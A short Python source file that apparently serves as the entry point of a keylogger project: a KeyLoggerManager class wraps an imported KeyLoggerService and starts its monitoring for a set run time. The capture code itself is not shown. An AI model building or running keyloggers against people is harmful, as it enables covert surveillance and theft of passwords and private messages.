from key_logger_service import KeyLoggerService


class KeyLoggerManager:


    def __init__(self, run_time):
        self.service = KeyLoggerService(run_time)


    def start_key_logger(self):
        self.service.start_monitoring()

if __name__ == "__main__":
    manager = KeyLoggerManager(2)
    manager.start_key_logger()